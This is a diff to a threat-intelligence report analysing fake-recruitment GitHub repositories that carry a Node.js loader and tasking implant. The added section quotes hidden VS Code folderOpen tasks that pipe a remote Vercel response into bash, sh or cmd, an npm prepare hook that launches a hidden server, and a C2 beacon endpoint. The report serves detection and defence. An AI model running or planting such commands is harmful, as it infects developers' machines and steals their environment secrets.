@@ -2,7 +2,7 @@
 title: "Interexy-Branded Gamifly Repositories: Evolution of the BetPoker Loader into a Vercel-Gated Node.js Tasking Implant"
 date: 2026-06-09
 author: "ThreatProphet"
-description: "Analysis of two byte-identical Gamifly GitHub repositories delivered through a LinkedIn and Calendly recruitment workflow. The repositories reuse the BetPoker/Dravion loader architecture, automatically launch a backend through VS Code and npm lifecycle mechanisms, exfiltrate the complete Node.js environment to a Vercel gate, and execute an obfuscated five-second tasking implant with rotated C2 infrastructure."
+description: "Analysis of two byte-identical Gamifly GitHub repositories delivered through a LinkedIn and Calendly recruitment workflow. The repositories reuse the BetPoker/Dravion loader architecture, automatically launch a backend through VS Code and npm lifecycle mechanisms, exfiltrate the complete Node.js environment to a Vercel gate, and execute an obfuscated five-second tasking implant. Follow-on hunting identified AjunaVerse and AlchemyMVP as later sibling branches of the same weaponized Git lineage."
 tags:
   - contagious-interview
   - fake-developer-recruitment
@@ -81,6 +81,8 @@ No operator task was returned during collection. That does not reduce the malici
 
 The loader is best assessed as an **evolution and reuse of the BetPoker/Dravion toolkit**, not as an unrelated new family. Several current files are exact SHA-256 matches for artifacts documented in previous ThreatProphet cases, including `.env.local`, `config/loadEnv.js`, `routes/index.js`, and `routes/api/auth.js`. The distinctive protocol also remains stable: base64 `AUTH_API`, full `process.env` POST, `x-app-request: ip-check`, `new Function("require", response.data)`, registrar-style beaconing, server-issued `sysId`, and conditional execution of C2-provided JavaScript. The main changes are delivery refinement, Vercel endpoint rotation, campaign-marker rotation, and a new C2 IP on the repeatedly observed port `1224`.
 
+Follow-on hunting conducted after the initial Gamifly analysis identified two additional public repositories, `LimitBreak-Solutions/AjunaVerse` and `AlchemyGlobal/AlchemyMVP`, that contain exact Git commit objects from the Gamifly history. At the time of review, both sibling repositories implemented a newer execution design: automatic platform-specific downloads from `vscode-settings-529[.]vercel[.]app`, the same npm `prepare` background-launch mechanism, and an embedded version of the five-second registrar/tasking implant directed to `138.201.128[.]169:1224`. These repositories were not delivered during the Interexy-branded interview; they are included as follow-on evidence of a repeatable repository-production pipeline and continued loader evolution.
+
 The technical linkage to the earlier ThreatProphet cluster is assessed with **high confidence**. Consistency with broader Contagious Interview / DPRK-linked fake-developer-recruitment tradecraft is assessed with **medium confidence**. Attribution to a specific state actor remains **low-to-medium confidence** because no single artifact proves operator identity. References to Interexy describe observed branding and GitHub organization names; they do not establish participation by the legitimate company or any real employee.
 
 ## Evidence Basis and Scope
@@ -95,11 +97,14 @@ This report is based on:
 - controlled retrieval of the Vercel response;
 - controlled reproduction of the tasking protocol without executing returned code;
 - preserved HTTP headers, response bodies, hashes, and scan output;
-- comparison with prior ThreatProphet BetPoker and Dravion-Core investigations.
+- comparison with prior ThreatProphet BetPoker and Dravion-Core investigations;
+- follow-on public review of the current AjunaVerse and AlchemyMVP branches and verification of shared Git commit objects.
 
 No C2-provided JavaScript was executed during analysis. The tasking endpoint was queried with controlled data to reproduce the implant protocol and preserve its standby response. The investigation did not obtain a C2 response with `status: "error"`; therefore, any operator-selected post-enrollment module remains unrecovered.
 
 The supplied evidence does not include the original LinkedIn screenshots, LinkedIn profile URL, the original chat message containing the repository link, or a recording/transcript of the call. Those omissions limit identity and social-engineering reconstruction but do not affect the technical verdict because the malicious repository, delivery gate, returned implant, and live tasking endpoint were independently preserved.
+
+The follow-on AjunaVerse and AlchemyMVP findings are based on public GitHub content observed on June 9, 2026, not on forensic mirror acquisitions. Their current files and shared commit objects were independently reviewed, but remote repository state may change after publication.
 
 **Brand-use notice:** the names `Interexy`, `interexyorg`, and `Interexywork` refer to observed lure branding and GitHub organization names. This report does not establish that the legitimate Interexy company, its personnel, or any similarly named third party created, controlled, or knowingly supported the repositories. The most defensible interpretation is impersonation or brand misuse unless independent evidence proves otherwise.
 
@@ -137,6 +142,9 @@ Claims are separated into three categories:
 | Task execution | `eval(message)` when C2 returns `status: "error"` |
 | Captured tasking state | Live standby response with server-assigned UUID |
 | Prior-case relationship | Exact artifact and protocol reuse from BetPoker/Dravion cluster |
+| Follow-on Git lineage | `LimitBreak-Solutions/AjunaVerse` and `AlchemyGlobal/AlchemyMVP` contain exact Gamifly commit objects |
+| Follow-on execution evolution | Platform-specific Vercel downloader plus npm `prepare` and embedded registrar beacon |
+| Follow-on tasking C2 | `138.201.128[.]169:1224/api/checkStatus` |
 | Technical cluster confidence | High |
 | DPRK-linked attribution confidence | Low-to-medium |
 
@@ -708,6 +716,122 @@ This wording is more defensible than claiming that all payload bytes are identic
 
 ---
 
+
+## Follow-on Git-Lineage Repositories and Post-Gamifly Evolution
+
+Follow-on hunting identified two additional public repositories that preserve the same weaponized Git lineage as Gamifly:
+
+```text
+hxxps://github[.]com/LimitBreak-Solutions/AjunaVerse
+hxxps://github[.]com/AlchemyGlobal/AlchemyMVP
+```
+
+These repositories were discovered through retrospective hunting and were not the repositories delivered during the Interexy-branded interview. They are therefore treated as cluster and evolution evidence, not as part of the original incident delivery chain.
+
+### Exact Git-Object Lineage
+
+The relationship is based on exact Git commit objects rather than theme, filename, or code similarity. Both repositories contain at least the following commits from the Gamifly history:
+
+| Commit | Subject | Significance |
+|---|---|---|
+| `89da1a9d1e0856957afa2217af2241257ac3670f` | `update Users Token \| testv1` | Introduced the application-integrated loader generation, including environment files, automatic tasks, gate logic, and remote response execution |
+| `ce9deb2ec4a745305eadbcdca57d4f5eeedb35f6` | `change routes/api/auth.js` | Earlier modification of the authentication route retained in the shared history |
+
+A Git commit identifier covers the commit tree, parent relationship, author and committer metadata, timestamps, and message. The presence of the same full identifiers therefore establishes shared repository ancestry or direct reuse of the Git object graph. Both follow-on projects also retain the poker application and `pokersolver` dependency beneath new metaverse/Web3 branding.
+
+### Newer Redundant Execution Architecture
+
+At the time of follow-on review, the current `master` branches of AjunaVerse and AlchemyMVP contained the same two execution paths.
+
+First, `.vscode/tasks.json` automatically runs the root dependency installation and separately downloads an operating-system-specific payload:
+
+```text
+macOS:  curl -L hxxps://vscode-settings-529[.]vercel[.]app/api/settings/mac | bash
+Linux:  wget -qO- hxxps://vscode-settings-529[.]vercel[.]app/api/settings/linux | sh
+Windows: curl --ssl-no-revoke -L hxxps://vscode-settings-529[.]vercel[.]app/api/settings/windows | cmd
+```
+
+Both tasks use `runOn: "folderOpen"`, suppress command echo, and use a silent terminal presentation. This adds direct shell or command-interpreter execution to the repository-open workflow.
+
+Second, both root manifests retain the npm lifecycle command:
+
+```json
+"prepare": "start /b node server || nohup node server &"
+```
+
+Consequently, the automatic `npm install` task can also launch the backend in the background. The current authentication route contains the obfuscated registrar/tasking implant directly at module scope rather than first retrieving it through the earlier base64 `AUTH_API` gate.
+
+The effective follow-on execution model is:
+
+```text
+Open trusted workspace
+  ├─ folderOpen env task
+  │   └─ download and execute OS-specific Vercel response
+  │
+  └─ folderOpen npm install task
+      └─ npm prepare lifecycle
+          └─ background node server
+              └─ import routes/api/auth.js
+                  └─ execute embedded registrar/tasking implant
+```
+
+### Rotated Follow-on Infrastructure and Marker
+
+Static decoding of the embedded implant recovered:
+
+```text
+hxxp://138.201.128[.]169:1224/api/checkStatus
+```
+
+The protocol remains consistent with Gamifly:
+
+```text
+sysInfo
+processInfo
+sysId
+tid
+five-second polling
+conditional eval(message) when status == "error"
+```
+
+The campaign marker changed to:
+
+```text
+bm93IGl0IHRpbWUgdG8gZ2V0IGV2ZXJ5dGhpbmc=
+```
+
+Decoded:
+
+```text
+now it time to get everything
+```
+
+The persistence of port `1224`, `/api/checkStatus`, the enrollment schema, five-second interval, and conditional JavaScript execution—combined with exact Git-object lineage—supports a high-confidence assessment that these are later sibling branches of the same repository-production and tasking toolkit.
+
+### Evolution Assessment
+
+The follow-on repositories show a meaningful design change from Gamifly. The earlier `.env`-based Vercel gate and disguised API-key validation were removed from the current branches, while the actor added a direct cross-platform downloader and embedded the registrar beacon in an application route that is loaded during backend startup. This creates redundant execution paths and reduces dependence on a single remote gate.
+
+The observed progression is:
+
+```text
+Early generation:
+  folderOpen Vercel response piped directly to Node
+
+Gamifly generation:
+  committed environment decoys
+  -> POST process.env to base64 Vercel gate
+  -> execute returned JavaScript with new Function()
+  -> registrar/tasking beacon
+
+AjunaVerse / AlchemyMVP generation:
+  OS-specific Vercel response piped to bash, sh, or cmd
+  + npm prepare background launch
+  + registrar/tasking beacon embedded directly in auth route
+```
+
+This evidence strengthens the assessment that the actor operates a repeatable repository-production pipeline in which a shared poker-derived history is cloned, rebranded, and updated with rotating delivery and tasking infrastructure.
+
 ## Git Metadata and Identity Cautions
 
 The repository history contains numerous names and email addresses, including:
@@ -843,6 +967,25 @@ ipcheck-six[.]vercel[.]app
 test-ip-check[.]vercel[.]app
 ```
 
+
+### Follow-on Hunting Indicators
+
+> The following indicators belong to repositories identified after the original incident. They support cluster hunting and should not be interpreted as infrastructure delivered by the `blakesmith.bz@gmail[.]com` interview persona.
+
+| Indicator | Type | Role |
+|---|---|---|
+| `LimitBreak-Solutions/AjunaVerse` | GitHub repository | Follow-on sibling repository sharing Gamifly Git objects |
+| `AlchemyGlobal/AlchemyMVP` | GitHub repository | Follow-on sibling repository sharing Gamifly Git objects |
+| `89da1a9d1e0856957afa2217af2241257ac3670f` | Git commit | Exact shared payload-integration commit |
+| `ce9deb2ec4a745305eadbcdca57d4f5eeedb35f6` | Git commit | Exact shared authentication-route commit |
+| `vscode-settings-529[.]vercel[.]app` | Domain | Current platform-specific downloader observed in both sibling repositories |
+| `hxxps://vscode-settings-529[.]vercel[.]app/api/settings/mac` | URL | macOS payload path |
+| `hxxps://vscode-settings-529[.]vercel[.]app/api/settings/linux` | URL | Linux payload path |
+| `hxxps://vscode-settings-529[.]vercel[.]app/api/settings/windows` | URL | Windows payload path |
+| `138.201.128[.]169` | IPv4 | Follow-on registrar/tasking host embedded in both repositories |
+| `hxxp://138.201.128[.]169:1224/api/checkStatus` | URL | Follow-on beacon endpoint |
+| `bm93IGl0IHRpbWUgdG8gZ2V0IGV2ZXJ5dGhpbmc=` | Encoded marker | Decodes to `now it time to get everything` |
+
 ### File and Evidence Hashes
 
 | SHA-256 | Artifact |
@@ -883,6 +1026,26 @@ new Function("require", response.data)
 ```
 
 Any single item may be benign. The combination is highly specific.
+
+For repository-lineage hunting, also search Git object databases for the exact commits:
+
+```text
+89da1a9d1e0856957afa2217af2241257ac3670f
+ce9deb2ec4a745305eadbcdca57d4f5eeedb35f6
+```
+
+For the newer sibling generation, combine:
+
+```text
+vscode-settings-529.vercel.app
+/api/settings/mac
+/api/settings/linux
+/api/settings/windows
+"prepare": "start /b node server || nohup node server &"
+138.201.128.169:1224/api/checkStatus
+bm93IGl0IHRpbWUgdG8gZ2V0IGV2ZXJ5dGhpbmc=
+pokersolver
+```
 
 Useful command-line search:
 
@@ -952,7 +1115,7 @@ If the project was opened or dependencies were installed:
 
 Assessed confidence: **high** that this case reuses and evolves the same loader/tooling cluster documented in BetPoker and Dravion-Core.
 
-The assessment is based on exact file hashes, identical malicious route code, the same environment-loading design, the same custom header, the same response-execution primitive, the same tasking schema, the same polling cadence, and the same recurring C2 port. Infrastructure and campaign markers changed, but the higher-level protocol and implementation remained stable.
+The assessment is based on exact file hashes, identical malicious route code, the same environment-loading design, the same custom header, the same response-execution primitive, the same tasking schema, the same polling cadence, and the same recurring C2 port. Infrastructure and campaign markers changed, but the higher-level protocol and implementation remained stable. Follow-on identification of AjunaVerse and AlchemyMVP adds exact cross-repository Git-object lineage and functionally identical newer branches, further supporting a maintained repository-production pipeline rather than isolated code reuse.
 
 ### Broader Actor Context
 
@@ -982,6 +1145,8 @@ External reporting is used for campaign context and cross-case comparison. Exact
 - ThreatProphet, **Kryptic Haven-Branded Git Challenge**, May 17, 2026: `https://threatprophet.com/posts/2026-05-17-kryptic-haven/`
 - GitHub repository observed during collection: `https://github.com/interexyorg/Gamifly`
 - Duplicate GitHub repository observed during collection: `https://github.com/Interexywork/Gamifly`
+- Follow-on Git-lineage repository: `https://github.com/LimitBreak-Solutions/AjunaVerse`
+- Follow-on Git-lineage repository: `https://github.com/AlchemyGlobal/AlchemyMVP`
 
 *TLP:CLEAR — This report may be freely shared. Attribution assessments are tentative and based on exact artifact reuse, protocol continuity, infrastructure rotation, and tradecraft similarity. All indicators are provided for defensive purposes. References to Interexy describe observed lure branding and repository names, not validated involvement by any legitimate company or real person.*
 
